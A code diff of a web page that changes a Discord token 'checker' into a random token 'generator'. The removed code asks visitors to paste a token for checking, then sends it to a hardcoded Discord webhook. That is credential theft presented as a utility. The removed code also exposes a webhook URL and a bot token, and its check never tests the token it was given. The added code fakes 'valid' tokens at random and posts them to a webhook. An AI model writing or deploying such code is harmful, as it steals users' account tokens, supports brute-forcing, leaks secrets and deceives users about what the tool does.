@@ -3,210 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Bot Token Checker</title>
+    <title>Token Generator</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
+            text-align: center;
+            margin: 50px;
         }
-        h1 {
-            color: #333;
-        }
-        .box {
-            width: 300px;
-            padding: 10px;
-            margin: 10px;
-            border-radius: 5px;
-            background-color: #fff;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .valid-box {
-            background-color: #e8f5e9;
-        }
-        .invalid-box {
-            background-color: #ffebee;
-        }
-        .button {
+        button {
             padding: 10px 20px;
             font-size: 16px;
             cursor: pointer;
-            background-color: #4caf50;
+            margin: 10px;
+            background-color: #4CAF50;
             color: white;
             border: none;
             border-radius: 5px;
-            margin: 10px;
+            transition: background-color 0.3s;
         }
-        .button:hover {
+        button:hover {
             background-color: #45a049;
         }
-        .token-list {
-            max-height: 200px;
-            overflow-y: auto;
-            margin-top: 10px;
+        #validTokens, #invalidTokens {
+            margin-top: 20px;
+        }
+        #validTokens ul, #invalidTokens ul {
+            list-style-type: none;
+            padding: 0;
         }
         .token {
-            padding: 5px;
             margin: 5px;
-            background-color: #f1f1f1;
-            border-radius: 3px;
-            font-size: 14px;
-        }
-        .token-checker {
-            margin-top: 20px;
-            width: 100%;
-            max-width: 350px;
-        }
-        .token-checker input {
-            width: 100%;
             padding: 10px;
-            font-size: 14px;
             border-radius: 5px;
-            border: 1px solid #ddd;
+            background-color: #f4f4f4;
         }
-        .token-checker button {
-            width: 100%;
-            padding: 10px;
-            font-size: 14px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            margin-top: 10px;
+        .valid {
+            background-color: #d4edda;
+        }
+        .invalid {
+            background-color: #f8d7da;
         }
     </style>
 </head>
 <body>
-    <h1>Token Checker</h1>
-    <button class="button" id="start-stop-btn" onclick="toggleGeneration()">Start</button>
-
-    <div class="box valid-box">
-        <h3>Valid Tokens:</h3>
-        <div class="token-list" id="valid-tokens"></div>
+    <h1>Token Generator</h1>
+    <button id="startStopButton">Start Generating Tokens</button>
+    
+    <div id="validTokens">
+        <h3>Valid Tokens</h3>
+        <ul id="validTokensList"></ul>
     </div>
 
-    <div class="box invalid-box">
-        <h3>Invalid Tokens: <span id="invalid-count">0</span></h3>
-    </div>
-
-    <div class="token-checker">
-        <h3>Check Your Token:</h3>
-        <input type="text" id="input-token" placeholder="Enter token to check">
-        <button onclick="checkUserToken()">Check Token</button>
+    <div id="invalidTokens">
+        <h3>Invalid Tokens</h3>
+        <ul id="invalidTokensList"></ul>
     </div>
 
     <script>
-        let invalidCount = 0;
-        let isGenerating = false;
-        const webhookUrl = 'https://discord.com/api/webhooks/1291292062993485824/E2RA9ftK97nJu813Lms3QcYGghu4J6v0CEZb1xkpNoys7-jru3MpC1dC7o2CATGicCMp';
-        const botToken = 'MTMxMzkzNTcwNDY2MDY0MzkzMg.GuAPNS.XAh9bxGr2gChVMXOozqBK28IX3YaClxwdbPNL0';
+        let generating = false;
+        let validTokens = [];
+        let invalidTokens = [];
 
-        function toggleGeneration() {
-            if (isGenerating) {
-                isGenerating = false;
-                document.getElementById('start-stop-btn').textContent = 'Start';
-            } else {
-                isGenerating = true;
-                document.getElementById('start-stop-btn').textContent = 'Stop';
-                generateToken();
-            }
-        }
-
-        async function generateToken() {
-            if (!isGenerating) return;
-            const token = generateRandomToken();
-            const isValid = await validateToken(token);
-            if (isValid) {
-                showValidToken(token);
-                sendToWebhook(token);
-            } else {
-                invalidCount++;
-                updateInvalidCount();
-            }
-            setTimeout(generateToken, 1000);
-        }
-
-        function generateRandomToken() {
-            const part1 = randomString(24);
-            const part2 = randomString(6);
-            const part3 = randomString(32);
-            return `${part1}.${part2}.${part3}`;
-        }
-
-        function randomString(length) {
+        function generateToken() {
             const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            let token = '';
+            for (let i = 0; i < 6; i++) {
+                token += characters.charAt(Math.floor(Math.random() * characters.length));
             }
-            return result;
-        }
-
-        async function validateToken(token) {
-            try {
-                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': `Bot ${botToken}`
-                    }
-                });
-                return response.ok;
-            } catch (error) {
-                return false;
+            token += '.';
+            for (let i = 0; i < 6; i++) {
+                token += characters.charAt(Math.floor(Math.random() * characters.length));
             }
+            token += '.';
+            for (let i = 0; i < 6; i++) {
+                token += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return token;
         }
 
-        function showValidToken(token) {
-            const validTokensContainer = document.getElementById('valid-tokens');
-            const tokenElement = document.createElement('div');
-            tokenElement.classList.add('token');
-            tokenElement.textContent = token;
-            validTokensContainer.appendChild(tokenElement);
+        function updateUI() {
+            document.getElementById('validTokensList').innerHTML = validTokens.map(token => `<li class="token valid">${token}</li>`).join('');
+            document.getElementById('invalidTokensList').innerHTML = invalidTokens.map(token => `<li class="token invalid">${token}</li>`).join('');
         }
 
-        function updateInvalidCount() {
-            document.getElementById('invalid-count').textContent = invalidCount;
-        }
+        function startStopGenerating() {
+            generating = !generating;
+            const button = document.getElementById('startStopButton');
+            button.innerText = generating ? 'Stop Generating Tokens' : 'Start Generating Tokens';
 
-        async function checkUserToken() {
-            const userToken = document.getElementById('input-token').value;
-            if (userToken) {
-                const isValid = await validateToken(userToken);
-                if (isValid) {
-                    showValidToken(userToken);
-                    sendToWebhook(userToken);
-                } else {
-                    alert('Invalid Token');
-                }
-            } else {
-                alert('Please enter a token');
+            if (generating) {
+                generateTokens();
             }
         }
 
-        async function sendToWebhook(token) {
-            const botInfo = await getBotInfo();
-            const payload = {
-                content: `Valid Token: ${token}`,
-                embeds: [
-                    {
-                        title: "Bot Information",
-                        fields: [
-                            {
-                                name: "Bot Username",
-                                value: botInfo.username,
-                                inline: true
-                            },
-                            {
-                                name: "Bot ID",
-                                value: botInfo.id,
-                                inline: true
-                            }
-                        ]
-                    }
-                ]
+        function generateTokens() {
+            if (!generating) return;
+
+            const token = generateToken();
+            invalidTokens.push(token);
+            updateUI();
+
+            // Send valid token to webhook
+            if (Math.random() < 0.1) {  // Simulate a valid token with a 10% chance (you can adjust this)
+                validTokens.push(token);
+                updateUI();
+                sendToWebhook(token);
+            }
+
+            setTimeout(generateTokens, 100);  // Adjust this interval for faster/slower generation
+        }
+
+        function sendToWebhook(token) {
+            const webhookUrl = 'YOUR_WEBHOOK_URL_HERE';
+            const data = {
+                content: `Valid Token: ${token}`
             };
 
             fetch(webhookUrl, {
@@ -214,36 +124,11 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Token sent to webhook');
-                } else {
-                    console.log('Error sending token to webhook');
-                }
-            })
-            .catch(error => {
-                console.error('Error sending token to webhook:', error);
+                body: JSON.stringify(data)
             });
         }
 
-        async function getBotInfo() {
-            try {
-                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': `Bot ${botToken}`
-                    }
-                });
-
-                const data = await response.json();
-                return { username: data.username, id: data.id };
-            } catch (error) {
-                console.error('Error fetching bot info:', error);
-                return { username: 'Unknown', id: 'Unknown' };
-            }
-        }
+        document.getElementById('startStopButton').addEventListener('click', startStopGenerating);
     </script>
 </body>
 </html>
